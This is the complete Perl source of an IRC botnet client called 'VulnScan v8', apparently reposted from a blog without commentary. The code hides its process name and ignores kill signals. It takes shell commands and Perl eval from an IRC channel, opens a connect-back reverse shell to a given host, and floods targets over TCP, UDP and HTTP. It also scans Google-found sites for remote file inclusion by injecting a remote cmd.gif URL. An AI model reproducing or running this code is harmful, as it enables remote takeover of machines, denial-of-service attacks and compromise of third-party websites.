#!/usr/bin/perl
# VulnScan v8 -Final- By Morgan
# Colors by delet
#
# Note:
# DO NOT REMOVE COPYRIGHTS ...
#
# |_|0|_|
# |_|_|0|
# |0|0|0|
#
# New functions :
#                New l33t colors
#                Fixed Google
#
# Scan command :
# !morgan !eval @gstring='google%20dork';
# !morgan @rfiscan vulnfile.php?vulnvar=
#
# DDoS commands :
# Udp : !morgan @udpflood IP packet-size time
# Tcp : !morgan @tcpflood IP port time
# Http: !morgan @httpflood www.website.com time
#
# Greets to :
#
# All irc.root.net.ve - #Morgan users...
#
#
# Enjoy the bot ....
# /Morgan

use HTTP::Request;
use LWP::UserAgent;

################ V8 CONFIGURATION #############################################################
my $processo = 'ps aux';                   # Fake process name for the bot                #
if (`ps uxw` =~ /ps aux/)                    # (CHANGE IT!!!)                               #
{                                              #                                              #
exit;                                          #                                              #
}                                              #                                              #
###############################################################################################
my $linas_max='8';                             # Avoid Flood                                  #
###############################################################################################
my $sleep='5';                                 # sleep time                                   #
##################### IRC #####################################################################
my @adms=("evil");                           # Administrator Nickname                       #
###############################################################################################
my @canais=("#dark");                        # Channel ..if  password -> ("#channel :pass") #
###############################################################################################
my $nick='evil';                             # Nick prefix of the bot example :             #
                                               # vs[v7] = vs[v7]-718727                       #
###############################################################################################
my $ircname = 'evil';                            # Identd of the bot                            #
###############################################################################################
chop (my $realname = `uname -a`);                 # Full Name                                    #
###############################################################################################
$servidor='dos.mygenc.org' unless $servidor;  # Server IRC of the bot                        #
###############################################################################################
my $porta='8889';                              # Server PORT                                  #
################ CMD ##########################################################################
my @cmdgif='http://rzgr.by.ru/cmd.gif';  # If you change this cmd must be same as:      #
                                                     # http://myspace.si/images/sad.gif       #
###############################################################################################

my $VERSAO = 'v8';
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir("/");
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);


our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();

$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
  } else {
      print $IRC_cur_socket "$_[0]\n";
  }
}
# MORGAN OWNED YOUR BOX
#
# morgan.rx@gmail.com
sub conectar {
   my $meunick = $_[0];
   my $servidor_con = $_[1];
   my $porta_con = $_[2];

   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con", PeerPort=>$porta_con) or return(1);
   if (defined($IRC_socket)) {
     $IRC_cur_socket = $IRC_socket;

     $IRC_socket->autoflush(1);
     $sel_cliente->add($IRC_socket);

     $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
     $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
     nick("$meunick");
     sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
     sleep 1;
   }
}
my $line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
   delete($irc_servers{''}) if (defined($irc_servers{''}));
   my @ready = $sel_cliente->can_read(0);
   next unless(@ready);
   foreach $fh (@ready) {
     $IRC_cur_socket = $fh;
     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
     $nread = sysread($fh, $msg, 4096);
     if ($nread == 0) {
        $sel_cliente->remove($fh);
        $fh->close;
        delete($irc_servers{$fh});
     }
     @lines = split (/\n/, $msg);

     for(my $c=0; $c<= $#lines; $c++) {
       $line = $lines[$c];
       $line=$line_temp.$line if ($line_temp);
       $line_temp='';
       $line =~ s/\r$//;
       unless ($c == $#lines) {
         parse("$line");
       } else {
           if ($#lines == 0) {
             parse("$line");
           } elsif ($lines[$c] =~ /\r$/) {
               parse("$line");
           } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse("$line");
           } else {
               $line_temp = $line;
           }
       }
      }
   }
}

sub parse {
   my $servarg = shift;
   if ($servarg =~ /^PING \:(.*)/) {
     sendraw("PONG :$1");
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
       my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
       if ($args =~ /^\001VERSION\001$/) {
         notice("$pn", "\001VERSION mIRC v6.16 Khaled Mardam-Bey\001");
       }
       if (grep {$_ =~ /^\Q$pn\E$/i } @adms) {
         if ($onde eq "$meunick"){
           shell("$pn", "$args");
         }
         if ($args =~ /^(\Q$meunick\E|\!morgan)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^\!(.*)/) {
              ircase("$pn","$onde","$1") unless ($natrix eq "!bot" and $arg =~ /^\!nick/);
            } elsif ($arg =~ /^\@(.*)/) {
                $ondep = $onde;
                $ondep = $pn if $onde eq $meunick;
                bfunc("$ondep","$1");
            } else {
                shell("$onde", "$arg");
            }
         }
       }
}
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
       if (lc($1) eq lc($meunick)) {
         $meunick=$4;
         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       }
   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
       nick("$meunick|".int rand(999999));
   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
       $meunick = $2;
       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
       foreach my $canal (@canais) {
         sendraw("JOIN $canal ddosit");
       }
   }
}

# MORGAN OWNED YOUR BOX
# www.morganxpl.com
# morgan.rx@gmail.com
sub bfunc {
  my $printl = $_[0];
  my $funcarg = $_[1];
  if (my $pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           if ($funcarg =~ /^portscan (.*)/) {
             my $hostip="$1";
             my @portas=("21","22","23","25","59","80","113","135","445","1025","5000","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","8080","8018","8889");
             my (@aberta, %porta_banner);
     sendraw($IRC_cur_socket, "PRIVMSG $printl :15(7@2PortScan15) 15(2IP7:12 ".$1." 15) 15(2Status7: 12Searching for Open Ports15)");
             foreach my $porta (@portas)  {
                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);
                if ($scansock) {
                   push (@aberta, $porta);
                   $scansock->close;
                }
             }

             if (@aberta) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :15(7@2PortScan15) 15(2Concluido15) 15(2Open Ports7:12 @aberta 15)");
             } else {
               sendraw($IRC_cur_socket,"PRIVMSG $printl :15(7@2PortScan15) 15(2Concluido15) 15(2No open ports found15)");
             }
           }
           if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
     sendraw($IRC_cur_socket, "PRIVMSG $printl :15(7@2TCP Flood15) 15(2Started15) (2IP7:12 ".$1." 2Porta7:12 ".$2." 2Tempo7:12 ".$3." 2segundos15)");
     my $itime = time;
     my ($cur_time);
             $cur_time = time - $itime;
     while ($3>$cur_time){
             $cur_time = time - $itime;
     &tcpflooder("$1","$2","$3");
             }
     sendraw($IRC_cur_socket, "PRIVMSG $printl :15(7@2TCP Flood15) 15(2Finished15) (2IP7:12 ".$1." 2Porta7:12 ".$2." 15)");
           }
   if ($funcarg =~ /^version/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :15(7@2Versao15) 12Vulnscan 2v87 ");
}

if ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {
my $host = "$1";
my $porta = "$2";
my $proto = getprotobyname('tcp');
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($porta, $iaddr);
my $shell = "/bin/sh -i";
if ($^O eq "MSWin32") {
$shell = "cmd.exe";
}
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
connect(SOCKET, $paddr) or die "connect: $!";
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system("$shell");
close(STDIN);
close(STDOUT);
close(STDERR);

if ($estatisticas)
{
sendraw($IRC_cur_socket, "PRIVMSG $printl :15(7@2ConnectBack15) 15(2Connecting15) (2IP7/2Port7:12 $host:$porta 15)");
}
}
#SCANNER
           if ($funcarg =~ /^rfiscan\s+(\d+)\s+(.*)/) {
         $boturl=$2;
   sendraw($IRC_cur_socket, "PRIVMSG $printl :15(7@2Scan15) (2Started15) (2Searching for7:12 ".$boturl." 2Time7:12 ".$1." 2seconds15)");
     srand;
     my $itime = time;
     my ($cur_time);
     my ($exploited);
         $boturl=$2;
             $cur_time = time - $itime;$exploited = 0;
while($1>$cur_time){
    $cur_time = time - $itime;
    @urls=fetch();
foreach $url (@urls) {
$cur_time = time - $itime;
 #sendraw($IRC_cur_socket, "PRIVMSG #debug :15(7@2Scan15) 15(2Exploiting7:12 ".$url2." 15)");
my $path = "";my $file = "";($path, $file) = $url =~ /^(.+)\/(.+)$/;
$url2 ="http://".$path."/".$boturl."@cmdgif?";
print "\n".$url2."\n\n";


# MORGAN OWNED YOUR BOX
# www.morganxpl.com
# morgan.rx@gmail.com

my $req=HTTP::Request->new(GET=>$url2);
my $ua=LWP::UserAgent->new();
$ua->timeout(10);
my $response=$ua->request($req);

if ($response->is_success) {
 if( $response->content =~ /By/ && $response->content =~ /chaos/ ){
 sendraw($IRC_cur_socket, "PRIVMSG $printl :15(7@2Vulnerable15) 15(2Vuln7:12 ".$url2." 15)");
}
}
else {
}
 }
}
     sendraw($IRC_cur_socket, "PRIVMSG $printl :15(7@2Scan15) 15(2Finished15) (2Scan Finished7:12 ".$1." 2seconds15)");
           }
           if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
     sendraw($IRC_cur_socket, "PRIVMSG $printl :15(7@2HTTP Flood15) (2Started15) (2Victim7:12 ".$1."7:1280 2Time7:12 ".$2." 2seconds15)");
     my $itime = time;
     my ($cur_time);
             $cur_time = time - $itime;
     while ($2>$cur_time){
             $cur_time = time - $itime;
     my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
             print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
     close($socket);
             }
     sendraw($IRC_cur_socket, "PRIVMSG $printl :15(7@2HTTP Flood15) (2Finished15) 15(2Victim7:12 ".$1."15)");
           }
           if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :15(7@2UDP Flood15) 15(2Started15) (2Victim7:12 ".$1." 2Size7:12 ".$2." 7KB 2Time7:12 ".$3." 2seconds15)");
             my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
             $dtime = 1 if $dtime == 0;
             my %bytes;
             $bytes{igmp} = $2 * $pacotes{igmp};
             $bytes{icmp} = $2 * $pacotes{icmp};
             $bytes{o} = $2 * $pacotes{o};
             $bytes{udp} = $2 * $pacotes{udp};
             $bytes{tcp} = $2 * $pacotes{tcp};
             sendraw($IRC_cur_socket, "PRIVMSG $printl :15(7@2UDP Flood15) 15(2Finished15) 15(2Sent7:12 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 7KB 2in12 ".$dtime." 2seconds15) (2Victim7:12 ".$1."15)");
           }
           exit;
       }
  }
}
# MORGAN OWNED YOUR BOX
# www.morganxpl.com
# morgan.rx@gmail.com
sub ircase {
  my ($kem, $printl, $case) = @_;

  if ($case =~ /^join (.*)/) {
     j("$1");
   }
   if ($case =~ /^part (.*)/) {
      p("$1");
   }
   if ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
        for (my $ca = 1; $ca <= $1; $ca++ ) {
          p("$2");
          j("$2");
        }
      } else {
          p("$chan");
          j("$chan");
      }
   }
   if ($case =~ /^op/) {
      op("$printl", "$kem") if $case eq "op";
      my $oarg = substr($case, 3);
      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   if ($case =~ /^deop/) {
      deop("$printl", "$kem") if $case eq "deop";
      my $oarg = substr($case, 5);
      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   if ($case =~ /^msg\s+(\S+) (.*)/) {
      msg("$1", "$2");
   }
   if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        msg("$2", "$3");
      }
   }
   if ($case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp("$1", "$2");
   }
   if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        ctcp("$2", "$3");
      }
   }
   if ($case =~ /^nick (.*)/) {
      nick("$1");
   }
   if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
       conectar("$2", "$1", 6667);
   }
   if ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }
   if ($case =~ /^eval (.*)/) {
     eval "$1";
   }
}
# MORGAN OWNED YOUR BOX
# www.morganxpl.com
# morgan.rx@gmail.com
sub shell {
  my $printl=$_[0];
  my $comando=$_[1];
  if ($comando =~ /cd (.*)/) {
    chdir("$1") || msg("$printl", "15(7@2INFO15) (2No souch file/directory15)");
    return;
  }
  elsif ($pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           my @resp=`$comando 2>&1 3>&1`;
           my $c=0;
           foreach my $linha (@resp) {
             $c++;
             chop $linha;
             sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
             if ($c == "$linas_max") {
               $c=0;
               sleep $sleep;
             }
           }
           exit;
       }
  }
}
# MORGAN OWNED YOUR BOX
# www.morganxpl.com
# morgan.rx@gmail.com
sub tcpflooder {
 my $itime = time;
 my ($cur_time);
 my ($ia,$pa,$proto,$j,$l,$t);
 $ia=inet_aton($_[0]);
 $pa=sockaddr_in($_[1],$ia);
 $ftime=$_[2];
 $proto=getprotobyname('tcp');
 $j=0;$l=0;
 $cur_time = time - $itime;
 while ($l<1000){
  $cur_time = time - $itime;
  last if $cur_time >= $ftime;
  $t="SOCK$l";
  socket($t,PF_INET,SOCK_STREAM,$proto);
  connect($t,$pa)||$j--;
  $j++;$l++;
 }
 $l=0;
 while ($l<1000){
  $cur_time = time - $itime;
  last if $cur_time >= $ftime;
  $t="SOCK$l";
  shutdown($t,2);
  $l++;
 }
}
# MORGAN OWNED YOUR BOX
# www.morganxpl.com
# morgan.rx@gmail.com
sub udpflooder {
  my $iaddr = inet_aton($_[0]);
  my $msg = 'A' x $_[1];
  my $ftime = $_[2];
  my $cp = 0;
  my (%pacotes);
  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;

  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;

  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
  return(undef) if $cp == 4;
  my $itime = time;
  my ($cur_time);
  while ( 1 ) {
     for (my $porta = 1; $porta <= 65000; $porta++) {
       $cur_time = time - $itime;
       last if $cur_time >= $ftime;
       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;

       for (my $pc = 3; $pc <= 255;$pc++) {
         next if $pc == 6;
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
       }
 }
     last if $cur_time >= $ftime;
  }
  return($cur_time, %pacotes);
}

sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}
sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}
sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}
sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}
sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}
sub j { &join(@_); }
sub join {
   return unless $#_ == 0;
   sendraw("JOIN $_[0]");
}
sub p { part(@_); }
sub part {
  sendraw("PART $_[0]");
}
sub nick {
  return unless $#_ == 0;
  sendraw("NICK $_[0]");
}
sub quit {
  sendraw("QUIT :$_[0]");
}

# MORGAN OWNED YOUR BOX
# www.morganxpl.com
# morgan.rx@gmail.com

sub fetch(){
    my $rnd=(int(rand(9999)));
    my $n= 80;
    if ($rnd<5000) { $n<<=1;}
    my $s= (int(rand(10)) * $n);
{
my @dominios = ("removed-them-all");
my @str;

foreach $dom  (@dominios)
{
    push (@str,"@gstring");
}

    my $query="www.google.com.ar/custom?q=";
    $query.=$str[(rand(scalar(@str)))];
    $query.="&num=$n&start=$s";
    my @lst=();
#sendraw("privmsg #Morgan :DEBUG only test googling: ".$query."");
    my $page = http_query($query);
    while ($page =~  m/<a class=l href=\"?http:\/\/([^>\"]+)\"?>/g){
if ($1 !~ m/google|cache|translate/){
    push (@lst,$1);
}
    }
    return (@lst);
}

sub http_query($){
    my ($url) = @_;
    my $host=$url;
    my $query=$url;
    my $page="";
    $host =~ s/href=\"?http:\/\///;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~s/$host//;
    if ($query eq "") {$query="/";};
    eval {
local $SIG{ALRM} = sub { die "1";};
alarm 10;
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
alarm 0;
close($sock);
    };

   return $page;
}
}
# MORGAN OWNED YOUR BOX
# www.morganxpl.com
# morgan.rx@gmail.com

# NOTE: DONT REMOVE COPYRIGHTS

출처: https://applicationlayer.tistory.com/116?category=335591 [applicationlayer]